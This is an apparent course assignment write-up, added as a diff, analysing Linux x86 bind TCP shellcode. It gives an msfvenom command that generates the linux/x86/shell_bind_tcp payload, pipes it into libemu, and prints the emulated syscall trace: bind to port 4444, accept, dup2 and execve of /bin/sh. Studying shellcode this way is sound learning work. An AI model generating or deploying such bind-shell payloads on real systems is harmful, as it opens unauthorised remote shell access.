@@ -1,1 +1,130 @@
 
+Assignment # 1
+• Create a Shell_Bind_TCP shellcode
+–Binds	to a port		
+–Execs	Shell on incoming connection 
+• Port number should be easily configurable
+
+Analysis of a Bind TCP shell
+
+Before writing a shell Bind TCP, first we will analysis of a Bind TCP shell. This will be helpful for understand the components to
+wirte "Bind TCP shell" assembly code i.e. nasm file. We took the support of msfvenom payload (linux/x86/shell_bind_tcp) & Libemu. 
+
+For that we need to execute the following command: 
+
+msfvenom -p linux/x86/shell_bind_tcp -f raw -a x86 --platform linux | /usr/bin/sctest -vvv -S -s 100000
+
+// only main part is given below, detail output is trunked //
+
+[emu 0x0x816e480 debug ] Flags: PF SF
+int socket (
+     int domain = 2;
+     int type = 1;
+     int protocol = 0;
+) =  14;
+int bind (
+     int sockfd = 14;
+     struct sockaddr_in * my_addr = 0x00416fc2 =>
+         struct   = {
+             short sin_family = 2;
+             unsigned short sin_port = 23569 (port=4444);
+             struct in_addr sin_addr = {
+                 unsigned long s_addr = 0 (host=0.0.0.0);
+             };
+             char sin_zero = "       ";
+         };
+     int addrlen = 16;
+) =  0;
+int listen (
+     int s = 14;
+     int backlog = 0;
+) =  0;
+int accept (
+     int sockfd = 14;
+     sockaddr_in * addr = 0x00000000 =>
+         none;
+     int addrlen = 0x00000010 =>
+         none;
+) =  19;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 14;
+) =  14;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 13;
+) =  13;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 12;
+) =  12;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 11;
+) =  11;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 10;
+) =  10;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 9;
+) =  9;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 8;
+) =  8;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 7;
+) =  7;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 6;
+) =  6;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 5;
+) =  5;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 4;
+) =  4;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 3;
+) =  3;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 2;
+) =  2;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 1;
+) =  1;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 0;
+) =  0;
+int execve (
+     const char * dateiname = 0x00416fb2 =>
+           = "/bin//sh";
+     const char * argv[] = [
+           = 0x00416faa =>
+               = 0x00416fb2 =>
+                   = "/bin//sh";
+           = 0x00000000 =>
+             none;
+     ];
+     const char * envp[] = 0x00000000 =>
+         none;
+) =  0;
+
+So, from the above analysis, we found that following components is necessary for create Shell_Bind_TCP shellcode
+
+a. socket
+b. bind
+c. listen
+d. accept
+d. dup2
+e. execve
